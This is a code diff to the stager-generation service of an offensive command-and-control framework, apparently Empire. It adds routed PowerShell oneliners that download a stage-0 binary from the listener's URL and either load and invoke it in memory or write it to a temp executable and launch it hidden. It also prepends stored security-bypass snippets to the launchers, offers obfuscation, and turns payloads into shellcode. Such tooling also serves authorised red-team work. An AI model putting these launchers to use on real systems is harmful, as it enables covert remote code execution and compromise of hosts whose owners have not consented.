@@ -19,6 +19,10 @@ from sqlalchemy import select
 from empire.server.common import helpers, packets
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
+from empire.server.core.exceptions import (
+    ModuleValidationException,
+    StagerGenerationException,
+)
 from empire.server.utils import data_util
 from empire.server.utils.donut_util import donut_create
 
@@ -29,11 +33,56 @@ log = logging.getLogger(__name__)
 
 _ARCH_MAP = {"x86": 1, "x64": 2, "both": 3}
 
+# Listener types that serve a C# / IronPython / Go stage-0 binary on a
+# stager URI. This is the single source of truth for the routed
+# generate_exe_oneliner / generate_go_exe_oneliner helpers — the per-site
+# allow-list that used to live in 13 stager/module files (sweep landed in
+# this PR) is consolidated here. Listeners outside this set (HTTP[S] Hop,
+# Template, future types) silently produce a syntactically-valid but
+# functionally-broken launcher if allowed through; raise instead.
+_STAGE0_SERVING_LISTENERS = frozenset(
+    {
+        "HTTP[S]",
+        "HTTP[S] MALLEABLE",
+        "smb_pivot",
+        "port_forward_pivot",
+    }
+)
+
 
 def _resolve_arch(arch: str) -> int:
     if arch not in _ARCH_MAP:
         raise ValueError(f"Unsupported arch: {arch}")
     return _ARCH_MAP[arch]
+
+
+def _require_stageless_parts(
+    active_listener, language, agent_code, comms_code, stager_code
+):
+    """Raise StagerGenerationException if any stageless building block is None.
+
+    generate_stager()/generate_comms()/generate_agent() return None on failure
+    (e.g. a port_forward_pivot whose parent listener is inactive or cannot supply
+    staging keys). Callers then do `.replace()`/`.join()` on the result, so a None
+    would surface as an opaque AttributeError/TypeError → HTTP 500. Failing here
+    with StagerGenerationException lets stager_service convert it to a clean 400.
+    """
+    missing = [
+        name
+        for name, value in (
+            ("agent", agent_code),
+            ("comms", comms_code),
+            ("stager", stager_code),
+        )
+        if value is None
+    ]
+    if missing:
+        listener_name = active_listener.options["Name"]["Value"]
+        raise StagerGenerationException(
+            f"Listener '{listener_name}' produced no {language} {'/'.join(missing)} "
+            "code for stageless generation; if it is a port_forward_pivot, its "
+            "parent listener may be inactive or unable to supply staging keys."
+        )
 
 
 class StagerGenerationService:
@@ -47,18 +96,72 @@ class StagerGenerationService:
         self.obfuscation_service = main_menu.obfuscationv2
         self.dotnet_compiler = main_menu.dotnet_compiler
 
-    def _write_launcher_resource(self, code: str) -> None:
-        """Write launcher code to the embedded resources directory for compilation.
+    def _write_unique_launcher(self, code: str) -> Path:
+        """Write launcher code to a unique per-compilation subdirectory.
 
-        This file path is shared across stager types (PowerShell and Python),
-        so concurrent stager generations can overwrite each other.
+        Returns the unique subdirectory so callers can patch the YAML Location
+        and clean up via shutil.rmtree regardless of whether compilation
+        succeeds or raises. Keeping the basename
+        as ``launcher.txt`` ensures the compiled manifest resource name matches
+        the hardcoded ``GetManifestResourceStream("launcher.txt")`` in the C#.
         """
-        launcher_path = (
-            self.dotnet_compiler.compiler_dir
-            / "Data/EmbeddedResources/common/launcher.txt"
+        common_dir = self.dotnet_compiler.compiler_dir / "Data/EmbeddedResources/common"
+        common_dir.mkdir(parents=True, exist_ok=True)
+        unique_dir = Path(tempfile.mkdtemp(dir=common_dir))
+        try:
+            (unique_dir / "launcher.txt").write_text(code, encoding="utf-8")
+        except OSError:
+            shutil.rmtree(unique_dir, ignore_errors=True)
+            raise
+        return unique_dir
+
+    @staticmethod
+    def _patch_launcher_yaml(stager_yaml: str, launcher_dir: Path) -> str:
+        """Return *stager_yaml* with the shared launcher Location replaced by
+        the unique per-compilation path. Raises RuntimeError if the expected
+        placeholder is absent so a YAML schema change fails loudly rather than
+        silently reintroducing the race condition. The placeholder is
+        ``common\\launcher.txt`` (Windows-style backslash), matching the
+        literal string in ``CSharpPS.yaml`` and ``CSharpPy.yaml``; switching
+        those files to forward slashes will trigger this error.
+        """
+        old = r"common\launcher.txt"
+        if old not in stager_yaml:
+            raise RuntimeError(
+                f"YAML patch failed: {old!r} not found in stager YAML; "
+                "the launcher directory will not be isolated"
+            )
+        return stager_yaml.replace(old, f"common\\{launcher_dir.name}\\launcher.txt")
+
+    def _compile_from_launcher(
+        self,
+        code: str,
+        yaml_rel_path: str,
+        stager_name: str,
+        dot_net_version: str,
+        obfuscate: bool,
+    ) -> Path:
+        stager_yaml = (self.main_menu.install_path / yaml_rel_path).read_text(
+            encoding="utf-8"
         )
-        launcher_path.parent.mkdir(parents=True, exist_ok=True)
-        launcher_path.write_text(code, encoding="utf-8")
+        launcher_dir = self._write_unique_launcher(code)
+        try:
+            patched_yaml = self._patch_launcher_yaml(stager_yaml, launcher_dir)
+            return self.dotnet_compiler.compile_stager(
+                patched_yaml,
+                stager_name,
+                dot_net_version=dot_net_version,
+                confuse=obfuscate,
+            )
+        finally:
+            try:
+                shutil.rmtree(launcher_dir)
+            except OSError:
+                log.warning(
+                    "Failed to remove temp launcher dir %s; stager code may persist on disk",
+                    launcher_dir,
+                    exc_info=True,
+                )
 
     def generate_launcher_fetcher(
         self,
@@ -76,6 +179,41 @@ class StagerGenerationService:
 
         return stager
 
+    @staticmethod
+    def _load_bypass_codes(bypasses: str, language: str) -> list[str]:
+        """Resolve whitespace-separated bypass names into a list of code strings,
+        dropping any whose stored language doesn't match the requested execution
+        language. Mismatches and unknown names log a warning and are silently
+        dropped — the caller still receives a (possibly empty) list and proceeds.
+        The csharp/go/ironpython EXE oneliner stagers pass language="powershell"
+        here because the delivered command is a PowerShell downloader regardless
+        of the payload language."""
+        if not bypasses:
+            return []
+        codes = []
+        normalized_language = language.lower() if language else ""
+        log_language = language or "<unspecified>"
+        names = bypasses.split()
+        with SessionLocal.begin() as db:
+            rows = db.scalars(
+                select(models.Bypass).where(models.Bypass.name.in_(names))
+            ).all()
+            by_name = {row.name: row for row in rows}
+            for name in names:
+                db_bypass = by_name.get(name)
+                if not db_bypass:
+                    log.warning(f"Bypass '{name}' not found; skipping")
+                    continue
+                stored_language = (db_bypass.language or "").lower()
+                if stored_language == normalized_language:
+                    codes.append(db_bypass.code)
+                else:
+                    log.warning(
+                        f"Dropping bypass '{name}' (language={db_bypass.language}) "
+                        f"for {log_language} execution context"
+                    )
+        return codes
+
     def generate_launcher(  # noqa: PLR0913
         self,
         listener_name,
@@ -86,26 +224,14 @@ class StagerGenerationService:
         user_agent="default",
         proxy="default",
         proxy_creds="default",
-        stager_retries="0",
-        safe_checks="true",
         bypasses: str = "",
     ):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
         """
+        bypasses_parsed = self._load_bypass_codes(bypasses, language)
         with SessionLocal.begin() as db:
-            bypasses_parsed = []
-            for bypass in bypasses.split(" "):
-                db_bypass = db.scalars(
-                    select(models.Bypass).where(models.Bypass.name == bypass)
-                ).first()
-                if db_bypass:
-                    if db_bypass.language == language:
-                        bypasses_parsed.append(db_bypass.code)
-                    else:
-                        log.warning(f"Invalid bypass language: {db_bypass.language}")
-
             db_listener = self.listener_service.get_by_name(db, listener_name)
             active_listener = self.listener_service.get_active_listener(db_listener.id)
             if not active_listener:
@@ -119,10 +245,8 @@ class StagerGenerationService:
                 user_agent=user_agent,
                 proxy=proxy,
                 proxy_creds=proxy_creds,
-                stager_retries=stager_retries,
                 language=language,
                 listener_name=listener_name,
-                safe_checks=safe_checks,
                 bypasses=bypasses_parsed,
             )
             if launcher_code:
@@ -164,14 +288,8 @@ class StagerGenerationService:
         """
         Generate powershell launcher embedded in csharp
         """
-        stager_yaml = (self.main_menu.install_path / "stagers/CSharpPS.yaml").read_text(
-            encoding="utf-8"
-        )
-
-        self._write_launcher_resource(posh_code)
-
-        return self.dotnet_compiler.compile_stager(
-            stager_yaml, "CSharpPS", dot_net_version=dot_net_version, confuse=obfuscate
+        return self._compile_from_launcher(
+            posh_code, "stagers/CSharpPS.yaml", "CSharpPS", dot_net_version, obfuscate
         )
 
     def generate_powershell_shellcode(
@@ -190,10 +308,21 @@ class StagerGenerationService:
             return None, err
 
         shellcode = donut_create(file=str(directory), arch=arch_type)
+        if shellcode is None:
+            return (
+                None,
+                "donut shellcode generation failed (check file path and architecture)",
+            )
         return shellcode, None
 
-    def generate_exe_oneliner(
-        self, language, obfuscate, obfuscation_command, encode, listener_name
+    def generate_exe_oneliner(  # noqa: PLR0913
+        self,
+        language,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        listener_name,
+        bypasses: str = "",
     ):
         """
         Generate an oneliner for an executable
@@ -223,7 +352,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+        {bypass_prefix}
         $wc=New-Object System.Net.WebClient;
         $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
         $bytes=$wc.DownloadData("{stage0_url}");
@@ -245,13 +376,14 @@ class StagerGenerationService:
             return helpers.powershell_launcher(launcher, launcher_front)
         return launcher
 
-    def generate_go_exe_oneliner(
+    def generate_go_exe_oneliner(  # noqa: PLR0913
         self,
         language,
         listener_name,
         obfuscate,
         obfuscation_command,
         encode,
+        bypasses: str = "",
     ):
         """
         Generate a oneliner for a executable
@@ -281,7 +413,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+            {bypass_prefix}
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
@@ -321,20 +455,171 @@ class StagerGenerationService:
             return f"{base}?hop={hop}"
         return base
 
+    def _stage0_url_for(self, listener, hop: str) -> str:
+        """Listener-aware stage 0 URL picker. Malleable listeners serve
+        the SharpireMalleable / Gopire binary at a stager-specific URI
+        that DefaultProfile does NOT carry (DefaultProfile is populated
+        from profile.post.client.stringify()) — defer to the listener's
+        own stager_url() instead. Legacy listeners keep the original
+        DefaultProfile + _build_stage0_url path unchanged.
+
+        Raises ModuleValidationException for listener types that cannot
+        actually serve a csharp/go binary on stage 0 (HTTP[S] Hop, Template,
+        future types) — the per-site allow-list this PR removed used to
+        emit the same error from every call site; consolidated here.
+
+        Note: `hop` is honored only on the legacy DefaultProfile branch.
+        Malleable does not currently implement pivoted stage 0 (see
+        http_malleable.py — search for "TODO: handle this with malleable"),
+        so the hop arg is intentionally dropped on the malleable branch.
+        """
+        name = listener.info["Name"]
+        if name not in _STAGE0_SERVING_LISTENERS:
+            raise ModuleValidationException(
+                f"Listener type {name!r} does not serve a stage 0 binary; "
+                f"C# / IronPython / Go stagers require one of: "
+                f"{sorted(_STAGE0_SERVING_LISTENERS)}."
+            )
+        if hasattr(listener, "stager_url"):
+            return listener.stager_url()
+        request_uri = self._get_request_uri(listener)
+        return self._build_stage0_url(listener.host_address, request_uri, hop)
+
+    def generate_exe_oneliner_routed(  # noqa: PLR0913
+        self,
+        language,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        listener_name,
+        bypasses: str = "",
+    ):
+        """Listener-aware wrapper around generate_exe_oneliner. Picks the
+        correct stage 0 URL via _stage0_url_for so malleable listeners
+        get their stager URI; otherwise produces the exact same oneliner
+        shape as generate_exe_oneliner.
+        """
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.listener_service.get_active_listener_by_name(
+                    listener.parent_listener_name
+                )
+        else:
+            hop = ""
+
+        launcher_front = listener.options["Launcher"]["Value"]
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._stage0_url_for(listener, hop)
+
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
+        launcher = f"""
+        {bypass_prefix}
+        $wc=New-Object System.Net.WebClient;
+        $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+        $bytes=$wc.DownloadData("{stage0_url}");
+        $assembly=[Reflection.Assembly]::load($bytes);
+        $assembly.EntryPoint.Invoke($null,$null);
+        """
+
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.obfuscation_service.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+        return launcher
+
+    def generate_go_exe_oneliner_routed(  # noqa: PLR0913
+        self,
+        language,
+        listener_name,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        bypasses: str = "",
+    ):
+        """Go mirror of generate_exe_oneliner_routed. Same listener-aware
+        URL pick, same oneliner shape as generate_go_exe_oneliner."""
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.listener_service.get_active_listener_by_name(
+                    listener.parent_listener.name
+                )
+        else:
+            hop = ""
+
+        launcher_front = listener.options["Launcher"]["Value"]
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._stage0_url_for(listener, hop)
+
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
+        launcher = f"""
+            {bypass_prefix}
+            # Create a temp file path
+            $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
+            $wc = New-Object System.Net.WebClient;
+            $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+            $url = "{stage0_url}";
+            $wc.DownloadFile($url, $tempFilePath);
+            Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
+        """
+
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.obfuscation_service.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+
+        return launcher
+
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
     ) -> Path:
         """
         Generate ironpython launcher embedded in csharp
         """
-        stager_yaml = (self.main_menu.install_path / "stagers/CSharpPy.yaml").read_text(
-            encoding="utf-8"
-        )
-
-        self._write_launcher_resource(python_code)
-
-        return self.dotnet_compiler.compile_stager(
-            stager_yaml, "CSharpPy", dot_net_version=dot_net_version, confuse=obfuscate
+        return self._compile_from_launcher(
+            python_code, "stagers/CSharpPy.yaml", "CSharpPy", dot_net_version, obfuscate
         )
 
     def generate_python_shellcode(
@@ -352,6 +637,11 @@ class StagerGenerationService:
 
         directory = self.generate_python_exe(posh_code, dot_net_version)
         shellcode = donut_create(file=str(directory), arch=arch_type)
+        if shellcode is None:
+            return (
+                None,
+                "donut shellcode generation failed (check file path and architecture)",
+            )
         return shellcode, None
 
     def generate_csharp_shellcode(
@@ -393,6 +683,11 @@ class StagerGenerationService:
 
         # Create shellcode from the EXE
         shellcode = donut_create(file=str(exe_path), arch=arch_type)
+        if shellcode is None:
+            return (
+                None,
+                "donut shellcode generation failed (check file path and architecture)",
+            )
         return shellcode, None
 
     def generate_shellcode(  # noqa: PLR0913
@@ -498,7 +793,7 @@ class StagerGenerationService:
         """
         MH_DYLIB = 6
         misc_dir = self.main_menu.install_path / "data/misc"
-        if hijacker.lower() == "true":
+        if hijacker:
             if arch == "x86":
                 dylib_path = misc_dir / "hijackers/template.dylib"
             else:
@@ -756,15 +1051,22 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             active_listener.options, language=language
         )
 
-        stager_code = (
-            active_listener.generate_stager(
-                active_listener.options, language=language, encrypt=False, encode=False
-            )
-            .replace("exec(agent_code, globals())", "")
-            .replace(
-                "stage = Stage()",
-                f"stage = Stage()\nserver='{active_listener.host_address}'",
-            )
+        stager_code = active_listener.generate_stager(
+            active_listener.options, language=language, encrypt=False, encode=False
+        )
+
+        # generate_stager()/generate_comms() return None on failure (e.g. a
+        # port_forward_pivot whose parent listener is inactive or can't supply
+        # staging keys). Fail with a clean StagerGenerationException — which
+        # stager_service converts to a 400 — rather than an opaque AttributeError
+        # from the .replace()/join() below.
+        _require_stageless_parts(
+            active_listener, language, agent_code, comms_code, stager_code
+        )
+
+        stager_code = stager_code.replace("exec(agent_code, globals())", "").replace(
+            "stage = Stage()",
+            f"stage = Stage()\nserver='{active_listener.host_address}'",
         )
 
         if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
@@ -782,13 +1084,19 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             active_listener.options, language=language
         )
 
-        stager_code = (
-            active_listener.generate_stager(
-                active_listener.options, language=language, encrypt=False, encode=False
-            )
-            .replace("IEX ($e.GetString($agentBytes))", "")
-            .replace('Start-Negotiate -s "$ser"', 'Start-Negotiate -s "$Script:server"')
+        stager_code = active_listener.generate_stager(
+            active_listener.options, language=language, encrypt=False, encode=False
         )
+
+        # See generate_python_stageless: fail cleanly on a None building block
+        # rather than an opaque AttributeError from the .replace() below.
+        _require_stageless_parts(
+            active_listener, language, agent_code, comms_code, stager_code
+        )
+
+        stager_code = stager_code.replace(
+            "IEX ($e.GetString($agentBytes))", ""
+        ).replace('Start-Negotiate -s "$ser"', 'Start-Negotiate -s "$Script:server"')
 
         if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
             full_agent = "\n".join([agent_code, stager_code, comms_code])
@@ -823,8 +1131,22 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         working_hours = active_listener.options["WorkingHours"]["Value"]
         lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
 
+        # Malleable listeners serialize their parsed profile into the compact
+        # JSON blob that Gopire consumes at runtime. Duck-type on the helper
+        # method rather than the listener's display name so a rename of
+        # HTTP[S] MALLEABLE can't silently degrade every Go agent to legacy
+        # mode. When present, we also pass -tags malleable to the Go compiler
+        # so comms/malleable.go + comms/http_malleable.go get included; plain
+        # builds skip those files entirely (no malleable types in the binary).
+        is_malleable = hasattr(active_listener, "serialize_profile_for_agent")
+        malleable_profile = (
+            active_listener.serialize_profile_for_agent() if is_malleable else ""
+        )
+
         return {
             "PROFILE": profile,
+            "MALLEABLE": is_malleable,
+            "MALLEABLE_PROFILE": malleable_profile,
             "HOST": active_listener.host_address,
             "SESSION_ID": session_id,
             "KILL_DATE": kill_date,
@@ -860,5 +1182,9 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         template_vars = self._build_template_vars(active_listener)
 
         return self.main_menu.go_compiler.compile_stager(
-            template_vars, "stager", goos="windows", goarch="amd64"
+            template_vars,
+            "stager",
+            goos="windows",
+            goarch="amd64",
+            build_tags=["malleable"] if template_vars["MALLEABLE"] else None,
         )
